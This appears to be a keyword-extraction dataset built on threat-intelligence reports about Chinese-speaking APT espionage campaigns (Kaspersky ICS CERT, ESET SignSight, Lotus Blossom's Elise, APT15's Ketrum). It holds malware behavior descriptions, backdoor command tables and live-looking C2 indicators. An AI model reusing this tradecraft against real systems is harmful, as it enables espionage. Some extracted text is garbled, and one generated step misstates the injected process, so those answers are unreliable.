LABservers perform only one function – redirecting the data received to a stage two server that is located in China. It is worth noting that the registration data of the stage one servers that we have seen includes the administrator’s email address registered on a Chinese resource, 163.com.Transfer of stolen data from infected systemsThe function of saving all data redirected to the stage two server was enabled on one of the stage one servers.Apparently, the attackers selected files manually, as the stolen data included files of different types from different directories. Only the files that had been selected were uploaded to the stage one server.VictimsWe currently know of more than a dozen victims of the attack and the investigation results indicate that this was a targeted and, one might even say, pinpoint attack. All the victims identified are associated with the defense industry or are public institutions.The attack targeted industrial plants, design bureaus and research institutes, government agencies, ministries and departments in several East European countries (Belarus, Russia, and Ukraine), as well as Afghanistan.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS23 © 2022 AO KASPERSKY LABCountries in which attack victims are locatedAbout the attackersA Chinese-speaking group is highly likely to be behind the attacks.1. We can see significant overlaps in tactics, techniques, and procedures(TTPs) with TA428 activity.2. The attack analyzed used the same weaponizer, which embeds code of aCVE-2017-11882 exploit in documents, as in earlier TA428 attacks that targeted enterprises in Russia’s military-industrial complex.3. Some indirect evidence also suggests a Chinese-speaking group verylikely being behind the attack. This includes:a. the use of hacking utilities that are popular in China, such as Ladon,b. the fact that the second stage CnC server is located in China,c. the fact that the CnC server registration information includes an emailaddress in the Chinese domain 163.com specified in the administrator’s contact data.In the course of our research, we analyzed 59 sessions in which the attackers connected to infected systems (importantly, these were cases where the attackers connected to infected systems and entered commands by hand rather than those associated with the malware running automatically). It turnsTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS24 © 2022 AO KASPERSKY LABout that the time of day when these sessions took place falls within the 8 am to 5 pm interval (with the exception of one case) in the GMT+8 time zone, where China (as well as some other countries) is located.Times of systemsTimes of attacker sessions on infected systemsWe believe that the attack series we have identified is an extension of known campaign described in the research of Cybereason, DrWeb, and NTTSecurity. This is supported by numerous facts and a large amount of evidence we have identified, from the choice of victims to matching CnC servers.The authors of the research mentioned above attribute the attacks they describe to the activity of Chinese-speaking APT groups, pointing to TA428 as one of the most likely perpetrators.An analysis of information obtained in the investigation suggests that cyberespionage was the purpose of the attack series in question.ConclusionsThe results of our research demonstrate that spear phishing remains one of the most relevant threats to industrial enterprises and public institutions. The attackers used primarily known backdoor malware, as well as standard techniques for lateral movement and antivirus solution evasion. At the same time, they were able to penetrate dozens of enterprises and even take control of the entire IT infrastructure, and IT security solutions of some of the organizations attacked.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS25 © 2022 AO KASPERSKY LABThe attack series that we have discovered is not the first in the campaign and, given that the attackers achieve a certain degree of success, we believe it is highly likely that they will continue to conduct similar attacks in the future. Industrial enterprises and public institutions should take extensive measures to repel such attacks successfully.We are not wrapping up our investigation as yet and will release information on new findings as they appear.If you have any questions or comments after reading this report or if you have any additional information that is relevant to the malicious campaign described in it, please do not hesitate to get in touch with us by sending an email to ics-cert@kaspersky.com.Recommendations1. Ensure that security software with support for centralized security policymanagement is installed on all servers and workstations and keep the antivirus databases and program modules of your security solutions up- to-date.2. Check that all security software components are enabled on all systems and that a policy is in place which requires the administrator password to be entered in the event of attempts to disable protection.3. Check that Active Directory policies include restrictions on user attemptsto log in to systems. Users should be only allowed to log in to those systems which they need to access in order to perform their job responsibilities.4. Restrict network connections, including VPN, to the systems on the OTnetwork; block connections on all those ports the use of which is not required by the industrial process.5. To the extent possible, limit trust relationships between the organization’sdomains and minimize the number of users with domain administrator privileges.6. Train employees of the enterprise to securely work with the internetresources, and corporate communication channel such as email. Specifically, explain the possible consequences of downloading and executing files from unverified sources. Focus on identifying phishing emails and on secure practices related to working with Microsoft Office documents.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS26 © 2022 AO KASPERSKY LAB7. Use accounts with local administrator and domain administrator privilegesonly when this is necessary in order to perform the job responsibilities.8. Restrict the ability of programs to gain SeDebugPrivilege privileges(where possible).9. Enforce a password policy that has password complexity requirementsand requires passwords to be changed on a regular basis.10. Consider using Managed Detection and Response class services to gainquick access to high-level knowledge and expertise of security professionals.11. Use dedicated ICS security solutions. Kaspersky Industrial CyberSecurity efficiently protects industrial endpoints and enables network monitoring on the OT network to identify and block malicious activity.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS27 © 2022 AO KASPERSKY LABAppendix I – indicators of compromiseNote: Indicators provided in this section were up-to-date and valid at the time of publication.File MD50A2E7C01B847D3B1C6EEBE6AF63DC140 DA765E4E6B0D2544FE3F71E384812C40TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS28 © 2022 AO KASPERSKY LABE005F5DA3BA5D6726DA4E6671605B814 CBB7E0B8DDE2241480B71B9C648C1501File pathC:\1\mcinsupd.cfg C:\1\mcinsupd.exe C:\1\mytilus3.dll C:\1C\ace.exe C:\2\LiveUpdate.exe C:\2\safestore64.dll C:\3\mcinsupd.cfg C:\3\mcinsupd.exe C:\3\mytilus3.dll C:\4\LiveUpdate.exe C:\4\safestore64.dll C:\Microsoft\MF\Instsrv.exe C:\Microsoft\MF\wus.dll C:\ProgramData\1C\ace.exe C:\ProgramData\2GIS\!research\Remediation.exe\winhelp.tmp C:\ProgramData\2GIS\conhost.exe C:\ProgramData\2GIS\conhost.exe.cab C:\ProgramData\2GIS\ps.cab C:\ProgramData\2GIS\Remediation.exe C:\ProgramData\2GIS\Remediation.exe.cab C:\ProgramData\2GIS\research\conhost.exe C:\ProgramData\2GIS\research\Ps.exe C:\ProgramData\2GIS\research\Remediation.exe C:\ProgramData\AADConnect\1.bat C:\ProgramData\AADConnect\bdtkexec.cfg C:\ProgramData\AADConnect\PtWatchDog.exe C:\ProgramData\AADConnect\TmDbgLog.dll C:\ProgramData\Adobe\ARM\mcsync.exe C:\ProgramData\Adobe\ARM\mcsync.log C:\ProgramData\Adobe\ARM\McUtil.dll C:\ProgramData\Apple\asOELnch.exe C:\ProgramData\Apple\ccLib.dll C:\ProgramData\Apple\NordLnch.cfg C:\ProgramData\ASUS\ALL\mcsync.exeTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS29 © 2022 AO KASPERSKY LABC:\ProgramData\ASUS\ALL\mcsync.log C:\ProgramData\ASUS\ALL\McUtil.dll C:\ProgramData\Intel\hccutils.dll C:\ProgramData\Intel\hkcmd.exe C:\ProgramData\Intel\hkSetting.cfg C:\ProgramData\Microsoft\AppV\hccutils.dll C:\ProgramData\Microsoft\AppV\hkcmd.exe C:\ProgramData\Microsoft\AppV\hkSetting.cfg C:\ProgramData\Microsoft\Crypto\RSA\asOELnch.exe C:\ProgramData\Microsoft\Crypto\RSA\ccLib.dll C:\ProgramData\Microsoft\Crypto\RSA\mcsync.exe C:\ProgramData\Microsoft\Crypto\RSA\mcsync.log C:\ProgramData\Microsoft\Crypto\RSA\McUtil.dll C:\ProgramData\Microsoft\Crypto\RSA\NordLnch.cfg C:\ProgramData\Microsoft\DRM\LiveUpdate.exe C:\ProgramData\Microsoft\DRM\mcinsupd.cfg C:\ProgramData\Microsoft\DRM\mcinsupd.exe C:\ProgramData\Microsoft\DRM\mytilus3.dll C:\ProgramData\Microsoft\DRM\safestore64.dll C:\ProgramData\Microsoft\MF\Active.GRL C:\ProgramData\Microsoft\MF\Instsrv.exe C:\ProgramData\Microsoft\MF\Pending.GRL C:\ProgramData\Microsoft\MF\wus.dll C:\ProgramData\Microsoft\uconhost.exe C:\ProgramData\Oracle\ace.exe C:\ProgramData\sh.exe C:\Users\Default\AppData\Roaming\winset\LiveUpdate.exe C:\Users\Default\AppData\Roaming\winset\safestore64.dll C:\Windows\System32\Tasks\GUP C:\Windows\System32\Tasks\hkcmd C:\Windows\System32\wam.dll C:\Windows\System32\wus.dll C:\Windows\SysWOW64\wus.dll C:\Windows\Temp\conhost.dll C:\Windows\Temp\conhost.exe C:\Windows\Temp\mcoemcpy.exe C:\Windows\Temp\McoemcpyRun.log C:\Windows\Temp\McUtil.dll C:\Windows\Temp\McUtil.dll.cab C:\Windows\Temp\net.log C:\Windows\Temp\smcw.dll C:\Windows\Web\1.bat C:\Windows\Web\1\hccutils.dll C:\Windows\Web\1\hkcmd.exe C:\Windows\Web\1\hkSetting.cfg C:\Windows\Web\ace.exe C:\Windows\Web\Ladon.exe C:\Windows\Web\wmic.vbs C:\ProgramData\Microsoft\Network\Downloader\Client.cfg C:\ProgramData\Microsoft\Network\Downloader\Update.exe C:\ProgramData\mc.cab C:\ProgramData\my_capture.exe %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MpClient.dll %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MsMpEng.exe %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MSCAL.OCX %AppData%\Roaming\Microsoft\MsMpEng.exeTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS30 © 2022 AO KASPERSKY LABC:\ProgramData\temp\wcrypt32.dll C:\ProgramData\temp\wmic.dll C:\ProgramData\ABBYY\FineReader\Client.cfg C:\ProgramData\ABBYY\FineReader\debug.log C:\ProgramData\ABBYY\FineReader\OEMPRINT.CAT C:\ProgramData\ABBYY\FineReader\Update.exe C:\ProgramData\ABBYY\FineReader\WINWORD.EXE_ C:\Windows\Temp\Client.cfg C:\ProgramData\Adobe\Setup\mcinsupd.exe C:\ProgramData\Adobe\Setup\mcinsupd.cfgSecurity solution verdictsBackdoor.Win32.Agent.myuhpj Backdoor.Win32.Agentb.ca Backdoor.Win32.Agentb.cc Backdoor.Win32.CotSam.a Backdoor.Win64.Agent.iwv Backdoor.Win64.Agent.iwy Backdoor.Win64.Agent.iwz Backdoor.Win64.Agent.ixl Backdoor.Win64.Agent.ixm HackTool.Win64.Agent.hk HEUR:Trojan.Win32.APosT.gen not-a-virus:NetTool.Win32.NbtScan.a Trojan.Win32.Agentb.kpkq Trojan.Win32.APosT.mim Trojan.Win32.APosT.min Trojan.Win32.APosT.mxw Trojan.Win64.Agent.qwhymc Trojan.Win64.Agent.qwhypj Trojan.Win64.Agentb.bdq Trojan.Win64.Agentb.bse Trojan.Win64.Agentb.bsf Trojan.Win64.Dllhijacker.km Trojan.Win64.Dllhijacker.ks Trojan.Win64.DllHijacker.qq HEUR:Backdoor.Win32.CotSam.gen Backdoor.Win64.CotSam.aDomain names and IP addresseswww1.nppnavigator[.]net www3.vpkimplus[.]com 45.151.180[.]178 custom.songuulcomiss[.]com tech.songuulcomiss[.]com video.nicblainfo[.]net 160.202.162[.]122 doc.redstrpela[.]net fax.internnetionfax[.]com www2.defensysminck[.]net info.ntcprotek[.]com www1.dotomater[.]club 192.248.182[.]121TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS31 © 2022 AO KASPERSKY LABwww2.sdelanasnou[.]com 54.36.189[.]105 5.180.174[.]10 45.63.27[.]162 server.dotomater[.]clubTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS32 © 2022 AO KASPERSKY LABKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT) is a global project of Kaspersky aimed at coordinating the efforts of automation system vendors, industrial facility owners and operators, and IT security researchers to protect industrial enterprises from cyberattacks. Kaspersky ICS CERT devotes its efforts primarily to identifying potential and existing threats that target industrial automation systems and the industrial internet of things.Kaspersky ICS CERTics-cert@kaspersky.comTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS33 © 2022 AO KASPERSKY LAB ","{'phrases': ['phishing emails', 'documents', 'PortDoor', 'malware', 'IP', 'backdoors', 'nccTrojan', 'compromise', 'systems', 'Ladon', 'network scanning', 'addition', 'domain', 'control', 'access', 'hashes', 'data', 'the network', 'command', 'servers', 'Infrastructure', 'Chinese', 'the attacks'], 'target': 'phishing emails; documents; PortDoor; malware; IP; backdoors; nccTrojan; compromise; systems; Ladon; network scanning; addition; domain; control; access; hashes; data; the network; command; servers; Infrastructure; Chinese; the attacks.'}"
the attackers; the website; GCA; Installers; the legitimate program; the trojanized installer; the legitimate program; Application; the backdoor; C2; commands; screenshots; the C2 server; RAT; system information; data; the compromised system.,"['1. Attackers compromised the VGCA website and trojanized two software installers hosted on it. 2. The trojanized installers included a backdoor named PhantomNet. 3. When executed by a victim, the installer would install the legitimate VGCA software and PhantomNet. 4. PhantomNet would communicate with C2 servers using HTTPS and certificate pinning. 5. PhantomNet could collect system info, proxy settings, credentials from the victim system. 6. PhantomNet could download additional plugins, including ones focused on lateral movement. 7. By hijacking the trusted VGCA software installers, the attackers could silently compromise targets that downloaded and installed the trojanized software. ']","Extract the keywords: 12/18/2020Operation SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityOperation SignSight: Supply-chain attack against a certification authority in Southeast Asiawelivesecurity.com/2020/12/17/operation-signsight-supply-chain-attack-southeast-asiaJust a few weeks after the supply-chain attack on the Able Desktop software, another similar attack occurred on the website of the Vietnam Government Certification Authority (VGCA): ca.gov.vn. The attackers modified two of the software installers available for download on this website and added a backdoor in order to compromise users of the legitimate application.ESET researchers uncovered this new supply-chain attack in early December 2020 and notified the compromised organization and the VNCERT. We believe that the website has not been delivering compromised software installers as of the end of August 2020 and ESET telemetry data does not indicate the compromised installers being distributed anywhere else. The Vietnam Government Certification Authority confirmed that they were aware of the attack before our notification and that they notified the users who downloaded the trojanized software.Supply-chain attack in VietnamIn Vietnam, digital signatures are very common, as digitally-signed documents have the same level of enforceability as “wet” signatures. According to Decree No. 130/2018, the cryptographic certificates used to sign documents must be granted by one of the authorized certificate providers that include the VGCA, which is part of the Government Cipher Committee. That committee, in turn, depends on the Ministry of Information and Communication.In addition to issuing certificates, the VGCA develops and distributes a digital signature toolkit. It is used by the Vietnamese government, and probably by private companies, to sign digital documents. The compromise of a certification authority website is a good opportunity for APT groups, since visitors are likely to have a high level of trust in a state organization responsible for digital signatures.As shown in Figure 1, it seems that these programs are deployed in the Party and State agencies.December 17, 2020url SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityFigure 1. Screenshot of ca.gov.vnAccording to ESET telemetry, ca.gov.vn was compromised from at least the 23 of July to the 16 of August 2020. Two of the installers available for download, gca01-client-v2-x32-8.3.msi and gca01- client-v2-x64-8.3.msi, were modified to include a piece of malware known as PhantomNet or SManager and recently analyzed by NTT Security. We were able to confirm that those installers were downloaded from ca.gov.vn over the HTTPS protocol, so we believe it is unlikely to be a man-in-the-middle attack. The URLs pointing to malicious installers were:rdthurl url is also confirmed by data from VirusTotal as shown in Figure 2.url SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityFigure 2. Screenshot of VirusTotal. It shows the URL where the trojanized installer was downloaded from.The trojanized installers are not properly signed but, we noticed that clean GCA installers are also incorrectly signed (The digital signature of the object did not verify). Both the official and trojanized MSIs use a certificate assigned to the Safenet company.Figure 3 is a summary of the supply-chain attack. To be compromised, a user would have to manually download and execute the compromised software hosted on the official website.url 3. Simplified scheme of the supply-chain attack.12/18/2020Operation SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityOnce downloaded and executed, the installer starts the genuine GCA program and the malicious file. The malicious file is written to C:\Program Files\VGCA\Authentication\SAC\x32\eToken.exe. By also installing the legitimate program, the attackers make sure that this compromise won’t be easily noticed by the end-users.This malicious file is a simple dropper that extracts a Windows cabinet file (.cab) named 7z.cab and that contains the backdoor.If the dropper runs as an admin, the backdoor is written to C:\Windows\apppatch\netapi32.dll and for the persistence, the dropper registers the malicious DLL as a service.If run as a regular user, the backdoor is written to %TEMP%\Wmedia\<GetTickCount>.tmp and for the persistence, the dropper creates a scheduled task that calls the export Entery of the malicious DLL. It’s interesting to note that the Entery export was also seen in versions of TManger used by TA428, as detailed by NTT Security.PhantomNetThe backdoor was named Smanager_ssl.DLL by its developers but we use PhantomNet, as that was the project name used in an older version of this backdoor. This most recent version was compiled on the 26 of April 2020, almost two months before the supply-chain attack. In addition to Vietnam, we have seen victims in the Philippines, but unfortunately we did not uncover the delivery mechanism in those cases.thThis backdoor is quite simple and most of the malicious capabilities are likely deployed through additional plugins. It can retrieve the victim’s proxy configuration and use it to reach out to the command and control (C&C) server. This shows that the targets are likely to be working in a corporate network.PhantomNet uses the HTTPS protocol to communicate with its hardcoded C&C servers: vgca.homeunix[.]org and office365.blogdns[.]com. In order to prevent a man-in-the-middle attack, PhantomNet implements certificate pinning, using functions from the SSPI library. The certificate is downloaded during the first connection with the C&C server and then stored in the Windows certificate store.In addition to the use of dynamic DNS providers, it is interesting to note that the name of the first subdomain, vgca, was chosen in order to mimic the name of the Vietnam Government Certification Authority.The implant can be controlled by the attackers using these five commands:Command IDDescription0x00110020 Get victim information (computer name, hostname, username, OS version, user privileges (admin or not), and the public IP address by querying ipinfo.io ).0x00110030Call the export DeletePluginObject of all installed plugins.0x00110040Plugin management (install, remove, update). The plugins have the following exports (including the typo in the first one): GetPluginInfomation , GetRegisterCode , GetPluginObject , DeletePluginObject .0x00110070Set a value of a given field in the main structure of the backdoor.0x547CBA78 Generate and set a password using the SSPI functions. The final purpose is unknown.On VirusTotal, we found one plugin that matches the exports above. It is a debug build and is named SnowballS according to its PDB path and other debug paths:E:\WorkCode\AD_Attacker\Server\EXE_DEBUG\SnowballS.pdb e:\workcode\ad_attacker\server\plugins\plugins\snowballs\cdomainquery.cppAn initial, cursory analysis suggests that this tool might be used for lateral movement, as it embeds Invoke-Mimikatz. It can also collect information about the victim machine and user accounts. This shows that PhantomNet can receive additional and complex plugins that are probably only deployed on machines of particular interest to the malware operators.In the case of the attack in Vietnam, we were not able to recover data about post-compromise activity and thus we don’t have visibility into the end goal of the attackers.url SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityWith the compromise of Able Desktop, the attack on WIZVERA VeraPort by Lazarus and the recent supply-chain attack on SolarWinds Orion, we see that supply-chain attacks are a quite common compromise vector for cyberespionage groups. In this specific case, they compromised the website of a Vietnamese certificate authority, in which users are likely to have a high level of trust.Supply-chain attacks are typically hard to find, as the malicious code is generally hidden among a lot of legitimate code, making its discovery significantly more difficult.For any inquiries, contact us as threatintel@eset.com. Indicators of Compromise can also be found in our GitHub repository.IoCsFilesSHA-1ESET detection nameDescription5C77A18880CF58DF9FBA102DD8267C3F369DF449 Win32/TrojanDropper.Agent.SJQ Trojanized installer ( gca01-client-v2-x64-8.3.msi )B0E4E9BB6EF8AA7A9FCB9C9E571D8162B1B2443A Win32/TrojanDropper.Agent.SJQ Trojanized installer ( gca01-client-v2-x32-8.3.msi )9522F369AC109B03E6C16511D49D1C5B42E12A44 Win32/TrojanDropper.Agent.SJQ PhantomNet dropper989334094EC5BA8E0E8F2238CDF34D5C57C283F2 Win32/PhantomNet.BPhantomNet5DFC07BB6034B4FDA217D96441FB86F5D43B6C62 Win32/PhantomNet.APhantomNet pluginC&C servers office365.blogdns[.]com vgca.homeunix[.]orgMITRE ATT&CKNote: This table was built using version 8 of the MITRE ATT&CK framework.TacticInitial AccessExecutionPersistenceDiscoveryCommand and ControlIDNameDescriptionT1195.002 Supply Chain Compromise: Compromise SoftwareSupply ChainAttackers modified the installer of the GCA01 software that is hosted on ca.gov.vn and added a backdoor to the MSI installer.T1204.002 User Execution: Malicious FileThe victim needs to manually execute the trojanized installer.T1053.005 Scheduled Task/Job: Scheduled TaskIf the user doesn’t have admin privileges, PhantomNet persists via a scheduled task.T1543.003 Create or Modify System Process: Windows ServiceIf the user has admin privileges, PhantomNet persists via a Windows service.T1033T1082System Owner/User DiscoverySystem Information DiscoveryT1090.001 Proxy: Internal ProxyPhantomNet implements a function to retrieve the username.PhantomNet implements a function to retrieve the OS version.PhantomNet can retrieve the proxy configuration of the default browser and use it to connect to the C&C server.url SignSight: Supplychain attack against a certiﬁcation authority in Southeast Asia | WeLiveSecurityTacticIDNameDescriptionT1071.001 Application Layer Protocol: Web ProtocolsPhantomNet uses HTTPS.T1573.002 Encrypted Channel: Asymmetric CryptographyPhantomNet can add a certificate to the Windows store and use it for certificate pinning for its HTTPS communications.17 Dec 2020 - 11:30AMurl ","{'phrases': ['Compromise', 'the VGCA', 'The trojanized installers', 'a backdoor', 'PhantomNet', 'the installer', 'C2', 'HTTPS', 'certificate pinning', 'system info', 'download', 'additional plugins', 'lateral movement', 'trust', 'the attackers', 'targets', 'the trojanized software'], 'target': 'Compromise; the VGCA; The trojanized installers; a backdoor; PhantomNet; the installer; C2; HTTPS; certificate pinning; system info; download; additional plugins; lateral movement; trust; the attackers; targets; the trojanized software.'}"
the attacker; CVE-2017-11882; an ASEAN Defense Minister's Meeting; DLL; NavShExt.dll; persistence; an autorun; registry; thumbcache_1CD60.db; data; the attack; IP address; 103.236.150[.]14; the malware; information; port; 118.,['1. A malicious RTF document is distributed via malspam. 2. The document exploits CVE-2017-11882 when opened by the victim. 3. A malicious DLL is dropped and injected into Explorer.exe. 4. The Elise malware is installed and establishes persistence. 5. Elise contacts its C2 server at 103.236.150[.]14. 6. Data exfiltration from the victim machine begins over encrypted C2 communications. '],"Extract the keywords: Lotus Blossom Continues ASEAN Targetingcommunity.rsa.com/community/products/netwitness/blog/2018/02/13/lotus-blossom-continues-asean-targetingDuring the last weeks of January (2018), nation state actors from Lotus Blossom conducted a targeted malspam campaign against the Association of Southeast Asian Nations (ASEAN) countries. Just months after the APT32 watering hole activity against ASEAN-related websites was observed in Fall 2017, this new activity clearly indicates the association (ASEAN) clearly remains a priority collection target in the region. This new Lotus Blossom campaign delivers a malicious RTF document posing as an ASEAN Defence Minister's Meeting (ADMM) directory (decoy) that also carries an executable (payload) embedded as an OLE object, the Elise backdoor.1/12The Elise backdoor is not new malware and has been successfully diagnosed in the past by Industry researchers (e.g. Palo Alto Unit 42's 2015 report) and more recently by Volexity and Accenture. Each of these are valuable resources to understanding the Elise malcode, infection process, and known capabilities of the backdoor. In addition, a current ANY.RUN playback of our observed Elise infection is also available.Upon opening of the MS Word document, our embedded file exploits CVE-2017-11882 to drop a malicious fake Norton Security Shell Extension module, 'NavShExt.dll', which is then injected into iexplore.exe to install the backdoor, begin collection, and activate command and control.Moving through the infection process, NetWitness Endpoint detects the initial exploit (CVE-2017- 1182) in action as the Microsoft Equation Editor, 'EQNEDT32.exe', scores high for potentially malicious activity. This same process was also flagged in our any.run playback.2/12Our malware then spins up an instance of 'iexplore.exe' and injects 'NavShExt.dll' into that process.3/12While this is happening, the malware establishes persistence by creating an autorun in the registry and then also creates 'thumbcache_1CD60.db' at 'Users\admin\AppData\Local\Microsoft\Windows\Explorer\' to store harvested data.4/125/12As the infection process completes, we now observe Elise network activity (e.g., exfil of victim data and C2) through a conveniently hidden instance of Internet Explorer.This traffic was also observed in NetWitness Packets, as the malware verifies the host IP address prior to kicking off C2 out to 103.236.150[.]14, which is likely compromised infrastructure.6/12Take note of the cookie set in this HTTP POST, because Lotus Blossom actors go to significant lengths to protect this data via both B64 encoding and AES encryption. The actual C2 for Elise takes place over ""cookie"" code and (rarely) body content.7/128/12Other infections (from the identical payload) each generated their own decoy domains to populate the host header, but in every case actually used the same hard-coded IP address, 103.236.150[.]14.9/1210/12After our Elise infection had run for about a day, we were visited by the threat actor. While it's unclear exactly what the actor may have been looking for, our infected (sandboxed) machine was not it and the backdoor was deleted.11/12Based on both previous activity and this current Lotus Blossom campaign, it is clear that we are witnessing the continued rise of cyber tradecraft and activity from nation-states in the Southeast Asian theater.Thanks to Kent Backman, Justin Lamarre, and Ahmed Sonbol for their assistance with this research.The following samples were used for this analysis:Malicious RTF ","{'phrases': ['A malicious RTF document', 'malspam', 'CVE-2017-11882', 'DLL', 'Elise', 'persistence', 'C2'], 'target': 'A malicious RTF document; malspam; CVE-2017-11882; DLL; Elise; persistence; C2.'}"
APT15; the malware; access; servers; HTTP requests; the response; the server; HTTP requests; key; the user; the device; RAT; functionality; disks; disks; encrypt; the data; commands; the operators; keylogging; uploading; data.,"[' 1. The malware is delivered to the target system through unspecified means. 2. The malware establishes persistence by registering as a service or adding itself to startup. 3. It collects system info and sends it to the C2 server encrypted. 4. The C2 responds with encrypted commands hidden in HTML. 5. The malware can then download files, execute commands, take screenshots, etc. based on the C2 instructions. ']","Extract the keywords: 5/22/2020Intezer - The Evolution of APT15's Codebase 2020The Evolution of APT15’s Codebase 2020intezer.com/blog/research/the-evolution-of-apt15s-codebase-2020May 21, 2020The Ke3chang group, also known as APT15, is an alleged Chinese government-backed cluster of teams known to target various high-proﬁle entities spanning multiple continents. Examples include attacks on European ministries, Indian embassies, and British military contractors. The group’s activities have been traced back to 2010 and it is known to boast a large number of custom tools, most often tailored to their speciﬁc target.In mid May, we identiﬁed three recently uploaded samples from VirusTotal that share code with older APT15 implants. We named this new family of samples, “Ketrum”, due to the merger of features in the documented backdoor families “Ketrican” and “Okrum”.We believe the operation was conducted very recently. Below we present a technical analysis of these samples and explain the evolution of APT15’s codebase over the last year.OVERVIEWThe three samples we discovered seem to be a mix of the Ketrican and Okrum backdoors documented by researchers at ESET in 2019. Features have been merged from these two malware families to create a different RAT class for the group. We’ve decided to call this umbrella of malware “Ketrum.”The new samples we found continue the Ke3chang group’s strategy of using a basic backdoor to gain control over the victim’s device, so that an operator can then connect to it and run commands manually to conduct further operations.Before beginning our technical analysis, we were able to connect these binaries to Ke3chang using Intezer Analyze:url - The Evolution of APT15's Codebase 2020Genetic AnalysisAll three samples contacted the same C2 server and appear to have been used in two different time periods, judging by the PE timestamps and VirusTotal upload date:Name RavAudio64.exe 2019-12-03VirusTotal Date PE Timestamp C27 Jan 2010Family menu.thehuguardian[.]com Ketrum1––2020-05-1613 May 2020www.thehuguardian[.]com Ketrum22020-05-1713 May 2020www.thehuguardian[.]com Ketrum2SHA256s 5de9b7311The C2 was registered towards the end of 2019, which makes us believe the ﬁrst PE timestamp was tampered with, and the latter two timestamps are at least close to the real compilation date.It’s also important to note the C2 was registered in China and ceased operating in mid May.THE BEST OF TWO WORLDSWe documented several interesting differences between the backdoors:Okrum Ketrum1Ketrum canurl - The Evolution of APT15's Codebase 2020Identify installed proxy servers and use them for HTTP requestsSpecial folder retrieval using registry key [HKEY_CURRENT_USER\Software\Mi‐ crosoft\Windows\CurrentVersion\Explorer\Shell Folders]The response from the server is an HTTP page with backdoor commands and argu‐ ments included in the HTML ﬁelds Backdoor commands are determined by a hashing value received from C2Communication with the C&C server is hidden in the Cookie and Set-Cookie headers of HTTP requests Impersonate a logged in user’s security contextCreate a copy of cmd.exe in their working directory and use it to interpret backdoor commands Usual Ke3chang backdoor functionalities – download, upload, execute ﬁles/shell com‐ mands and conﬁgure sleep time Screenshot-grabbing functionalityTable 1KETRUM 1The Ketrum 1 sample was uploaded to VirusTotal in December 2019. This version registers itself as a “WMI Provider Host” service if it is able to obtain SeDebugPrivilege; otherwise it creates an entry in the startup directory.This sample incorporates many features from Okrum as can be seen in the table above, however, it abandons more advanced Okrum features such as offering a reﬂective injection via an export and the use of hashes to receive command IDs.In the past, APT15 has used the IWebBrowser2 COM interface to manage its network communications. This time, the Ketrum developer abandoned this technique and used simple HTTP APIs:Interestingly, this sample also incorporates a screenshot-grabbing command.KETRUM 2Ketrum 2 seems to have been built for minimalism. As can be seen in Table 1, many functionalities have been dropped.Unlike the Ketrican variant, Ketrum implants no longer try to weaken the system’s security conﬁgurations. In previous implants, Powershell was used for this end. Interestingly, a string still remains in Ketrum 2, which refers to this deleted feature—perhaps an unintentional left-over from copy-pasting:Several other interesting unused ﬁle names are included in the binary such as “%s\adult.sft” and “%s\Message”.The malware ﬁrst collects basic system information to track the infected endpoint and then sends it to the C2 server together with a hash of the system info:url - The Evolution of APT15's Codebase 2020All incoming and outcoming payloads are fed through an RC4 encryption and base64 encoding. The RC4 encryption uses an unusual key:These are actually constants used in the MD5 and SHA1 algorithms. The Ketrum developer most likely intended to confuse researchers reversing this function.A command is then extracted from the HTML in the response:This backdoor only supports a limited number of commands, which is typical of Okrum and Ketrican backdoors. Unlike Ketrum 1, Ketrum 2 does not support screenshot grabbing. This is the list of possible backdoor commands:url - The Evolution of APT15's Codebase 2020Description Adjust sleep time Execute a shell command Upload a ﬁle Download a ﬁle Execute a ﬁleCommand ID 7 (there is no 6) Execute a shell command with adjusted sleep time 8 9Adjust execute shell sleep time Download “Notice” ﬁle to working directory – * it is unclear how this is usedCODE REUSEBoth Ketrum samples resemble a similar layout to previous Ke3chang tools, apart from low level implementation and use of system APIs. Even in the two Ketrum samples, there are differences between the low-level APIs used to achieve the same functionality. For example, the ﬁle upload feature is implemented using different APIs throughout the families; mostly using a constant value of 0x20000 when reading ﬁles:Ketrum 1 Ketrum 2url - The Evolution of APT15's Codebase 2020Ketrican 2018OkrumAs reported by FireEye and ESET, it’s likely the Ke3chang cluster of malware is developed by multiple teams and the developers of Ketrican/Okrum belong to a different team than the developers of Ketrum, albeit related. This could explain the high-level and ﬂow similarities but also the low-level differences.CONCLUSIONKe3chang’s numerous tools such as Okrum, Ketrican, TidePool, Mirage, Ketrum, and others all serve the same purpose, give or take a few techniques or functionalities tailored for speciﬁc targets. We can regard these tools under the same umbrella of BS2005 malware, distributed as different versions per operation. However, the distinction created by naming them differently is useful for tracking the group’s operations and different development cycles.The Ke3chang’s group tools have not deviated much from the same tools reported in FireEye’s ﬁrst Ke3chang report. The group continues to morph its code and switch basic functionalities in their various backdoors. This strategy has been working for the group for years and there is no indication yet that it will deviate from this modus operandi.The information security ﬁeld has seen many improvements since the group’s inception, however, surprisingly, this is not 45.56.84[.]25Paul Litvak Paul is a malware analyst and reverse engineer at Intezer. He previously served as a developer in the Israel Defense Force (IDF) Intelligence Corps for three yearsurl 